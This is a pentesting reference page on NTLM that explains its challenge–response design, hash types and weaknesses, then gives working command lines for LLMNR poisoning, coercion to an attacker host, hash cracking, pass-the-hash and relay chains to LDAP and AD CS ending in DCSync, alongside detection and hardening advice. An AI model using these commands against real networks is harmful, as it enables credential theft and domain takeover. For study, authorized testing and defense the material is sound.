---
title: NTLM
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - pentesting
---

# NTLM 

## 1. What NTLM is

NTLM (NT LAN Manager) is a family of Microsoft authentication protocols built on a **challenge–response** mechanism. It was introduced as the successor to the older, badly broken LAN Manager (LM) protocol, and uses hashing to avoid sending the plaintext password over the wire.

Key facts:

- NTLM is a **suite** of protocols: LM, NTLMv1, and NTLMv2, together with the NTLM Security Support Provider (NTLMSSP) and session-security mechanisms.
- It is a **single-sign-on / network authentication** protocol — it validates credentials across a network without sending the cleartext password or the raw password hash itself.
- Microsoft has replaced NTLM with **Kerberos** as the default in Active Directory domains, but NTLM remains as a fallback. It is still used when a client authenticates to a server **by IP address**, to a server in a **different / untrusted domain**, to **workgroup (non-domain) machines**, or when Kerberos otherwise fails.
- Microsoft **officially deprecated NTLM in 2024**, but fully disabling it requires a coordinated migration across identity, applications, and network services — so it is still nearly everywhere.
- NTLM has **no default transport**. It is carried inside other protocols — most commonly **SMB, HTTP(S), LDAP, SMTP, and MSSQL**. That is exactly why relay attacks are so flexible.


>**NTLM is not a network protocol. It has no “wire” of its own.** It’s just a credential-validation _conversation_ made of three little data blobs (the NTLMSSP messages: Negotiate → Challenge → Authenticate).
> Those three blobs have to hitch a ride inside **some other protocol that’s already connected** — SMB, HTTP, LDAP, SMTP, MSSQL, etc. That host protocol is the **envelope**. NTLM is the **letter** inside it.

![[ntlm_sheet.png]]


---

## 2. Where the hashes live

This is the single most important thing to understand before attacking NTLM, because "NTLM hash" is used loosely to mean two very different things.

### The NT hash (a.k.a. "NTLM hash")

- Computed as `MD4(UTF-16-LE(password))`.
- Stored **at rest** — in the local SAM database, in LSASS memory, and in `NTDS.dit` on domain controllers.
- Unsalted and not iterated. Two users with the same password have the same NT hash.
- This is the value you use in a **Pass-the-Hash** attack.
- Format you'll see it in: `aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0` — that's `LMhash:NThash`, where the left half `aad3b435...` is the "empty" LM hash. The example right-hand value is the NT hash of an **empty** password.

### The NetNTLM response (NetNTLMv1 / NetNTLMv2)

- The value sent **over the wire** during the challenge-response handshake.
- Derived from the NT hash **plus** a server challenge (and, for v2, a client challenge, timestamp, and target info).
- Captured by tools like Responder from live network authentication.
- This is what you **crack offline** or **relay** — you **cannot** Pass-the-Hash with a NetNTLMv2 value.

||NT hash|NetNTLMv1|NetNTLMv2|
|---|---|---|---|
|Where found|SAM / LSASS / NTDS.dit|On the wire|On the wire|
|Pass-the-Hash?|✅ Yes|❌ No|❌ No|
|Crackable offline?|✅ (mode 1000)|✅ easy (mode 5500)|✅ harder (mode 5600)|
|Relayable?|n/a|✅ Yes|✅ Yes|

> **The crucial distinction:** the _at-rest NT hash_ enables Pass-the-Hash; the _on-the-wire NetNTLM response_ enables cracking and relaying. Mixing these up is the most common beginner mistake.

---

## 3. How NTLM authentication works

NTLM is a three-message exchange between client and server (the messages are part of NTLMSSP, sometimes called Type 1 / Type 2 / Type 3):

```
   CLIENT                                           SERVER
     |                                                 |
     |  (1) NEGOTIATE  (Type 1)                        |
     |------------------------------------------------>|
     |      "I want to authenticate; here are my       |
     |       capabilities / supported flags"           |
     |                                                 |
     |  (2) CHALLENGE  (Type 2)                        |
     |<------------------------------------------------|
     |      8-byte random server challenge (nonce)     |
     |      + target info                              |
     |                                                 |
     |  (3) AUTHENTICATE (Type 3)                      |
     |------------------------------------------------>|
     |      response = f(NT hash, challenge, ...)      |
     |      + username + domain                        |
     |                                                 |
     |   Server verifies response using the stored     |
     |   NT hash. In a domain, the server forwards     |
     |   it to a Domain Controller via Netlogon        |
     |   (pass-through authentication).                 |
     |                                                 |
     |  (4) ACCESS GRANTED / DENIED                    |
     |<------------------------------------------------|
```

1. **Negotiate (Type 1):** the client announces it wants to authenticate and advertises supported options/flags.
2. **Challenge (Type 2):** the server generates a random 8-byte challenge (a nonce, unique per attempt) and sends it back. The randomness is what's supposed to stop simple replay.
3. **Authenticate (Type 3):** the client encrypts/HMACs the challenge using a key derived from the user's NT hash and sends the result (the "response") back together with the username and domain.
4. **Verification:** the server checks the response against the NT hash it has stored. In a domain, the member server doesn't know the hash, so it relays the triple (username, challenge, response) to a **Domain Controller** over the Netlogon secure channel for verification — this is "pass-through authentication."

The key property: the password hash is **never transmitted** — only a value derived from it and the challenge. The weaknesses come from _how_ that derivation works and from the fact that the derivation can be **relayed** or **cracked**.

---

## 4. NTLMv1 vs NTLMv2 in detail

### LM (LAN Manager) — legacy, broken

- Password uppercased, null-padded to 14 bytes, split into two 7-byte halves, each used as a DES key to encrypt a fixed string.
- Case-insensitive, split into two independently-attackable 7-char chunks → trivially crackable. **Should be disabled everywhere.**

### NTLMv1 (NetNTLMv1)

- Challenge-response using the NT hash and DES.
- The 16-byte NT hash is padded to 21 bytes, split into three 7-byte DES keys, each encrypting the **server challenge** to produce a 24-byte response.
- **Critically weak:** because it's just DES over a known 8-byte challenge, a NetNTLMv1 response can be converted and **the NT hash recovered directly** — effectively DES brute-force is cheap, and with a fixed challenge (e.g. `1122334455667788`) precomputed **rainbow tables / crack.sh** make it near-instant. Recovering the NT hash means you then get Pass-the-Hash too.
- Hashcat mode: **5500**.

### NTLMv2 (NetNTLMv2)

- Stronger: uses **HMAC-MD5** instead of DES.
- First an intermediate key is formed: `NTLMv2-key = HMAC-MD5(NT-hash, uppercase(username) + domain)`.
- The response is `HMAC-MD5(NTLMv2-key, server_challenge + blob)`, where the **blob** contains a timestamp, a random **client challenge**, and target information.
- Adding a **client-side challenge + timestamp** defeats precomputed tables and makes replay much harder. The response is variable length (it carries the client challenge so the server can verify it).
- Still crackable offline (dictionary/brute-force against the HMAC), just far slower than v1.
- Hashcat mode: **5600**.

### NTLMv2 session security / NTLM2 Session

- A middle ground where NTLMv1-style messaging carries an 8-byte client challenge that is MD5-hashed with the server challenge; the low 8 bytes become the effective challenge. Improves on raw v1 but is weaker than full v2.

> ⚠️ **Common doc error to watch for:** some write-ups list hashcat `-m 5600` for "NTLMv1." That's wrong — **5600 = NetNTLMv2, 5500 = NetNTLMv1**. NT hash itself is **1000**.

---

## 5. Why NTLM is weak

- **No mutual authentication** by default — the client doesn't verify the server, which is the root enabler of relay/MITM.
- **No channel binding** by default — a response captured on one channel can be replayed on another (SMB→LDAP, HTTP→LDAP, etc.).
- **NT hash is password-equivalent** — because it's unsalted MD4, possessing it is as good as the password (Pass-the-Hash). No amount of password length changes that for PtH.
- **Crackable responses** — NetNTLMv1 is near-trivial; NetNTLMv2 falls to wordlists for weak passwords.
- **No MFA** — NTLM can't carry a second factor.
- **Downgrade** — a client/attacker can often negotiate the weaker v1 (via `LMCompatibilityLevel` misconfiguration or forced static challenges).
- **Easy to trigger** — Windows will happily authenticate to attacker-controlled hosts via LLMNR/NBT-NS poisoning, WebDAV, or coercion, often with **no user interaction**.

---

## 6. Pentesting NTLM — the attack map

There are four core offensive primitives. Everything else is a combination of them.

```
                         ┌─────────────────────────┐
                         │   GET NTLM AUTH TRAFFIC  │
                         │  (poison / coerce / MITM)│
                         └───────────┬─────────────┘
                                     │
                 captured NetNTLM response (v1/v2)
                                     │
             ┌───────────────────────┴───────────────────────┐
             ▼                                                 ▼
     ┌───────────────┐                              ┌────────────────────┐
     │  CRACK offline │                              │  RELAY (no crack)  │
     │  hashcat/john  │                              │   ntlmrelayx.py    │
     └───────┬────────┘                              └─────────┬──────────┘
             │ recover password                                │ authenticate AS victim
             ▼                                                  ▼
     ┌───────────────┐                              ┌────────────────────┐
     │  plaintext     │                              │ SMB → SAM dump/RCE │
     │  → log in      │                              │ LDAP → RBCD/ShadowC│
     └───────────────┘                              │ HTTP(ADCS) → ESC8  │
                                                     └────────────────────┘

   Separately, if you already hold an at-rest NT hash:
     ┌─────────────────────────────────────────────────────────┐
     │  PASS-THE-HASH: authenticate with the NT hash directly   │
     │  (nxc/cme/impacket/evil-winrm -H)  → lateral movement    │
     └─────────────────────────────────────────────────────────┘
```

|Primitive|Input|Output|Signature tools|
|---|---|---|---|
|**Capture**|network position|NetNTLMv1/v2 responses|Responder, Inveigh, mitm6|
|**Coerce**|low-priv creds or unauth|forced auth from a target|PetitPotam, printerbug/dementor, Coercer, DFSCoerce|
|**Crack**|NetNTLM response|plaintext password|hashcat, John|
|**Relay**|live auth you can forward|session as the victim|ntlmrelayx.py|
|**Pass-the-Hash**|at-rest NT hash|session as the victim|nxc/CrackMapExec, impacket, evil-winrm|

---

## 7. Capturing hashes

### 7.1 LLMNR / NBT-NS / mDNS poisoning (Responder)

When a Windows host fails DNS, it falls back to broadcast name resolution (LLMNR, NBT-NS, mDNS). An attacker on the same L2 segment answers "yes, that's me," the victim then tries to authenticate, and you capture its NetNTLMv2.

```bash
# Capture mode: answer name-resolution queries and collect hashes
sudo responder -I eth0 -w -v        # -w WPAD rogue proxy, -v verbose

# Hashes are stored in a SQLite DB and as text logs:
#   /usr/share/responder/Responder.db
#   /usr/share/responder/logs/
# Config file:
#   /etc/responder/Responder.conf
```

Captured NetNTLMv2 looks like `user::DOMAIN:<serverchallenge>:<HMAC>:<blob>` — feed that straight to hashcat `-m 5600`.

> **Downgrade to NTLMv1** (if `LMCompatibilityLevel` allows it) by forcing a **static challenge** `1122334455667788` in `Responder.conf`, then crack via crack.sh rainbow tables or reformat with `ntlmv1-multi`. This can yield the **NT hash directly** → Pass-the-Hash.

### 7.2 IPv6 poisoning (mitm6)

Most networks don't use IPv6 but Windows prefers it. `mitm6` becomes the rogue DHCPv6 server + DNS, funnels victim auth to you, and pairs naturally with ntlmrelayx (HTTP→LDAP).

### 7.3 "Steal a hash" file/document tricks

Drop a booby-trapped file on a writable share or send it; when the victim's Explorer/app touches it, it authenticates to your SMB/WebDAV listener:

- **SCF** files (`scuffy`/NetExec `scuffy` module), **LNK** files (`slinky` module), `.library-ms`, `.url`, Office/`.docx` remote templates, and UNC paths in documents.
- MSSQL: `xp_dirtree`, `xp_fileexist` pointing at `\\attacker\share`.
- `certutil`, and many other built-ins, can be coaxed into fetching a UNC path.

### 7.4 Coercion — forcing a machine to authenticate

Coercion makes a target (often a **Domain Controller**, as its machine account) authenticate to you on demand, with no user interaction. These are the trigger for the strongest relay chains.

|Technique|Tool|Protocol abused|
|---|---|---|
|**PrinterBug / SpoolSample**|`printerbug.py`, `dementor.py`|MS-RPRN (Print Spooler)|
|**PetitPotam**|`PetitPotam.py`|MS-EFSR (EFS RPC) — can be unauth on some builds|
|**DFSCoerce**|`dfscoerce.py`|MS-DFSNM|
|**ShadowCoerce**|`shadowcoerce.py`|MS-FSRVP|
|**Coercer**|`Coercer`|sprays all of the above automatically|

```bash
# PrinterBug (needs any domain creds)
python3 printerbug.py 'DOMAIN/user:password'@<TARGET_DC_IP> <ATTACKER_IP>

# PetitPotam (sometimes works unauthenticated on unpatched hosts)
python3 PetitPotam.py <ATTACKER_IP> <TARGET_DC_IP>

# Coercer — try every method at once
Coercer coerce -l <ATTACKER_IP> -t <TARGET_DC_IP> -u user -p password -d domain.local
```

---

## 8. Cracking captured hashes

Offline, massively parallel, no lockouts. Match the hashcat **mode** to the hash type:

|Hash|hashcat `-m`|John format|
|---|---|---|
|NT hash (at rest)|**1000**|`nt`|
|LM|**3000**|`lm`|
|NetNTLMv1|**5500**|`netntlm`|
|NetNTLMv2|**5600**|`netntlmv2`|

```bash
# NetNTLMv2 (most common capture) with a wordlist + rules
hashcat -m 5600 captured_v2.txt rockyou.txt -r rules/best64.rule

# NetNTLMv1 — often crack.sh / rainbow-table territory, near-instant with static challenge
hashcat -m 5500 captured_v1.txt rockyou.txt

# Straight NT hash (e.g. dumped from NTDS.dit) — brute/mask
hashcat -m 1000 nt_hashes.txt -a 3 ?u?l?l?l?l?l?d?d

# John equivalents
john --format=netntlmv2 captured_v2.txt --wordlist=rockyou.txt
```

Notes:

- **NetNTLMv1 is the priority** — if you can downgrade to it, you usually recover the NT hash wholesale.
- For NetNTLMv2, success depends entirely on password strength; weak/reused passwords fall fast.
- If v2 won't crack, **relay it instead** — relaying doesn't care how strong the password is.

---

## 9. Pass-the-Hash

If you already hold an **at-rest NT hash** (from SAM, LSASS/mimikatz, or NTDS.dit), you authenticate **as that user without ever knowing the password** — because NTLM treats the NT hash as the credential. (This only works against **NTLM**, never Kerberos; and it uses the NT hash, **not** a NetNTLMv2 response.)

```bash
# NetExec (successor to CrackMapExec) — spray a hash across a subnet
nxc smb 192.168.1.0/24 -u Administrator -H 31d6cfe0d16ae931b73c59d7e0c089c0 --shares
# (full LM:NT form also accepted: -H aad3b435b51404eeaad3b435b51404ee:31d6...)

# Execute as that user
nxc smb 10.10.10.10 -u Administrator -H <NThash> -x "whoami"

# Impacket remote shells with a hash
psexec.py  DOMAIN/Administrator@10.10.10.10 -hashes :<NThash>
wmiexec.py DOMAIN/Administrator@10.10.10.10 -hashes :<NThash>
secretsdump.py DOMAIN/Administrator@10.10.10.10 -hashes :<NThash>   # dump more hashes

# WinRM with a hash
evil-winrm -i 10.10.10.10 -u Administrator -H <NThash>
```

**Overpass-the-Hash** turns an NT hash into a Kerberos TGT (`getTGT.py -hashes`), letting you pivot into Kerberos-based access from an NTLM credential.

---

## 10. NTLM relay

The marquee NTLM attack. Instead of cracking a captured response, you **forward it in real time** to another service and authenticate **as the victim**. You never learn the password; strong passwords don't help the defender here.

**Prerequisites that make it work:**

- The target service must **not enforce signing / channel binding** (e.g. **SMB signing disabled/not required**, LDAP signing not enforced, no EPA on HTTP).
- The relayed account must have **useful privileges** on the target.
- You need auth to forward — from poisoning (§7.1–7.3) or coercion (§7.4).

```bash
# 1) Find relay targets (SMB signing NOT required)
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt

# 2) If poisoning: turn OFF Responder's own SMB & HTTP servers so ntlmrelayx can bind them
#    (edit /etc/responder/Responder.conf: SMB = Off, HTTP = Off), then:
sudo responder -I eth0

# 3) Relay to SMB — dump SAM on any host where the account is local admin
ntlmrelayx.py -tf targets.txt -smb2support

# Relay and run a command instead of dumping
ntlmrelayx.py -tf targets.txt -smb2support -c 'powershell -enc <base64>'

# Interactive SOCKS: keep relayed sessions alive to pivot through
ntlmrelayx.py -tf targets.txt -smb2support -socks
```

**Why SMB→SMB but not SMB→LDAP by default:** SMB sets a "signing required / MIC" flag in the auth, which normally blocks relaying SMB-originated auth to LDAP. Impacket's `--remove-mic` can strip the Message Integrity Code on vulnerable (unpatched Drop-the-MIC / CVE-2019-1040-class) targets to make cross-protocol relays work.

---

## 11. High-impact relay chains

Relaying to **LDAP** or **AD CS** is where domain compromise happens. Combine **coercion of a DC** (§7.4) with a relay target.

### 11.1 Relay to LDAP → Resource-Based Constrained Delegation (RBCD)

Grant a computer account you control delegation rights over the victim, then impersonate any user (incl. Domain Admin) to it.

```bash
ntlmrelayx.py -t ldaps://<DC> --remove-mic -smb2support --delegate-access
# then abuse msDS-AllowedToActOnBehalfOfOtherIdentity with getST.py -impersonate Administrator
```

Prereqs: typically two DCs to relay between and ≥ Server 2012 functional level; the relayed account needs to be able to create a computer object (or supply one).

### 11.2 Relay to LDAP → Shadow Credentials

Write `msDS-KeyCredentialLink` on the victim object, then PKINIT-auth as it and recover its NT hash.

```bash
ntlmrelayx.py -t ldaps://<DC> --remove-mic -smb2support --shadow-credentials
```

### 11.3 Relay to AD CS Web Enrollment → **ESC8** (full domain compromise)

AD CS HTTP enrollment (`/certsrv/`) accepts NTLM and, by default, **does not enforce EPA/channel binding**. Coerce the **DC** to authenticate, relay to AD CS, obtain a **certificate for the DC's machine account**, use it with **PKINIT** to get a TGT, recover the DC's NT hash, and **DCSync**.

```bash
# Relay to the CA's web enrollment, request a DC-template cert
ntlmrelayx.py -t http://<CA-HOST>/certsrv/certfnsh.asp -smb2support --adcs --template DomainController

# In another terminal, coerce the DC to authenticate to you:
python3 PetitPotam.py <ATTACKER_IP> <DC_IP>

# Then: Certipy to turn the cert into a TGT / NT hash, then secretsdump DCSync
certipy auth -pfx dc.pfx -dc-ip <DC_IP>
```

Maps to MITRE ATT&CK **T1557.001** (AiTM: LLMNR/NBT-NS poisoning & SMB relay) and **T1550.002** (Pass-the-Hash).

### 11.4 Relay to LDAP → dump the directory

```bash
ntlmrelayx.py -t ldap://<DC> -smb2support --dump-domain   # read AD objects as the relayed user
```

---

## 12. Notable CVEs

- **CVE-2025-24054 (2025)** — NTLM hash **disclosure via spoofing**. A crafted `.library-ms` file causes Explorer to fire an SMB auth to a remote host, **leaking the NTLMv2-SSP hash with minimal-to-no user interaction** (sometimes just extracting a ZIP). Patched 11 Mar 2025; **actively exploited within ~8 days** and added to CISA's KEV catalog. CVSS 6.5; affects Windows 10/11 and Server 2008 R2–2025. Originally tracked as CVE-2025-24071.
- **CVE-2024-43451** — related NTLM hash-disclosure spoofing bug.
- **CVE-2019-1040 ("Drop the MIC")** — NTLM MIC can be stripped, enabling cross-protocol relays (the basis for `--remove-mic`).
- **"PetitPotam" (MS-EFSR)** and **"PrinterBug" (MS-RPRN)** — coercion primitives (not a single CVE; partially mitigated over time).

Trend: Microsoft keeps shipping patches for **hash-leak / coercion** issues, but because disabling NTLM is a big migration, the **attack surface persists**.

---

## 13. Detection

- **Windows Event IDs:** `4624`/`4625` (logon success/failure) with **Authentication Package = NTLM**; `4776` (DC credential validation). High volumes of `4625`/`4776` suggest relay or brute force.
- **NTLM auditing:** enable "Network Security: Restrict NTLM: Audit NTLM authentication in this domain" to log where NTLM is still used before you block it.
- **Honeytokens / canary accounts** and **honey SMB shares** to catch poisoning/coercion.
- **Anomalous machine-account auth** (a DC authenticating to a random workstation) is a strong coercion indicator.
- **Unexpected certificate enrollments** (ESC8) tied to machine accounts.
- Watch for **LLMNR/NBT-NS responders** and **rogue DHCPv6** (mitm6) on the wire.

---

## 14. Defenses & hardening

Priority order for most environments:

1. **Enforce SMB signing** (require, not just enable) on all hosts — kills SMB relay.
2. **Enforce LDAP signing + LDAP channel binding** on DCs — kills LDAP relay.
3. **Enable EPA (Extended Protection for Authentication)** on HTTP services, especially **AD CS web enrollment**, and disable HTTP enrollment where possible — kills ESC8.
4. **Disable LLMNR, NBT-NS, and mDNS**; disable WPAD — removes Responder's poisoning surface.
5. **Disable IPv6** if unused, or block rogue DHCPv6 — removes mitm6.
6. **Disable NTLMv1 and LM entirely** (`LMCompatibilityLevel = 5`, "send NTLMv2 only / refuse LM & NTLM"). Never allow static-challenge downgrades.
7. **Restrict / audit NTLM** and move to **Kerberos**; aim to **disable NTLM** where the ecosystem allows (Microsoft is deprecating it).
8. **Patch coercion & hash-leak CVEs** (PetitPotam/PrinterBug mitigations, CVE-2025-24054, etc.); **block outbound SMB (445/139)** to the internet.
9. **Protect at-rest hashes:** Credential Guard, LSASS protection, tiered admin, and **no reused local admin passwords** (LAPS) — this is what blunts Pass-the-Hash.
10. **Account Protections:** mark sensitive accounts "**Account is sensitive and cannot be delegated**" and add them to **Protected Users**.

---

## 15. Quick command reference

```bash
# --- CAPTURE ---
sudo responder -I eth0 -w -v                         # LLMNR/NBT-NS/mDNS poisoning
mitm6 -d domain.local                                # IPv6 DNS takeover

# --- COERCE ---
python3 printerbug.py 'DOM/u:p'@<DC> <ATTACKER_IP>   # MS-RPRN
python3 PetitPotam.py <ATTACKER_IP> <DC>             # MS-EFSR
Coercer coerce -l <ATTACKER_IP> -t <DC> -u u -p p -d dom  # spray all

# --- RELAY ---
nxc smb 10.0.0.0/24 --gen-relay-list targets.txt     # find unsigned SMB
ntlmrelayx.py -tf targets.txt -smb2support           # SMB relay → SAM dump
ntlmrelayx.py -t ldaps://<DC> --remove-mic -smb2support --delegate-access     # RBCD
ntlmrelayx.py -t ldaps://<DC> --remove-mic -smb2support --shadow-credentials  # ShadowCreds
ntlmrelayx.py -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController  # ESC8

# --- CRACK ---
hashcat -m 5600 v2.txt rockyou.txt -r rules/best64.rule   # NetNTLMv2
hashcat -m 5500 v1.txt rockyou.txt                        # NetNTLMv1
hashcat -m 1000 nt.txt -a 3 ?u?l?l?l?l?d?d                 # NT hash

# --- PASS-THE-HASH ---
nxc smb 10.0.0.0/24 -u Administrator -H <NThash> --shares
psexec.py DOM/Administrator@<host> -hashes :<NThash>
evil-winrm -i <host> -u Administrator -H <NThash>
secretsdump.py DOM/Administrator@<DC> -hashes :<NThash>   # or -just-dc for NTDS.dit
```

---

## 16. Sources

- Check Point Research — _CVE-2025-24054, NTLM Exploit in the Wild_: https://research.checkpoint.com/2025/cve-2025-24054-ntlm-exploit-in-the-wild/
- The Hacker News — _CVE-2025-24054 Under Active Exploitation / added to CISA KEV_: https://thehackernews.com/2025/04/cve-2025-24054-under-active.html
- Secure-ISS — _Microsoft Windows NTLM Hash Disclosure Vulnerability (CVE-2025-24054, affected versions, mitigations)_: https://www.secure-iss.com/newsroom/microsoft-windows-ntlm-hash-disclosure-vulnerability
- TrustedSec — _Practical Attacks against NTLMv1_ (downgrade, LDAP relay, --remove-mic, RBCD/Shadow Creds): https://trustedsec.com/blog/practical-attacks-against-ntlmv1
- PKF O'Connor Davies — _Authentication Relay Basics_ (relay vs pass-the-hash, NetNTLMv1/v2): https://www.pkfod.com/insights/authentication-relay-basics/
- Hackmag — _Your guide to NTLM relay_ (Responder DB/config paths, ntlmrelayx workflow): https://hackmag.com/security/ntlm-relay-guide
- Black Hills InfoSec — _Coercions and Relays: The First Cred Is the Deepest_ (PrinterBug/PetitPotam, relay matrix): https://www.blackhillsinfosec.com/wp-content/uploads/2022/09/Coercions-and-Relays-The-First-Cred-is-the-Deepest.pdf
- JumpCloud — _What is NTLM (NT LAN Manager)?_ (overview, challenge-response, v1/v2): https://jumpcloud.com/it-index/what-is-ntlm-nt-lan-manager
- Lepide — _What is NTLM Authentication?_ (step-by-step flow, Kerberos fallback): https://www.lepide.com/blog/what-is-ntlm-authentication/
- O'Reilly, _Windows Security Monitoring_, Ch.9 — _Authentication Protocols_ (NTLMSSP, transports, no default ports): https://www.oreilly.com/library/view/windows-security-monitoring/9781119390640/c09.xhtml
- Wikipedia — _NT LAN Manager_ (NTLMv1/v2 algorithm structure, NTLM2 Session): https://en.wikipedia.org/wiki/NT_LAN_Manager
- SentinelOne — _Windows NTLM_ (tooling overview, CISA KEV note, relay mitigations): https://www.sentinelone.com/cybersecurity-101/identity-security/windows-ntlm/
- hashcat — _Example Hashes_ (mode reference 1000/3000/5500/5600): https://hashcat.net/wiki/doku.php?id=example_hashes
- Tool repos: Impacket (`ntlmrelayx.py`, `secretsdump.py`, `psexec.py`) https://github.com/fortra/impacket · Responder https://github.com/lgandx/Responder · PetitPotam https://github.com/topotam/PetitPotam · NetExec https://github.com/Pennyw0rth/NetExec · Certipy https://github.com/ly4k/Certipy · mitm6 https://github.com/dirkjanm/mitm6

---

_Written for authorized testing and defense. Hash-type modes verified against hashcat's reference (NetNTLMv1 = 5500, NetNTLMv2 = 5600, NT = 1000)._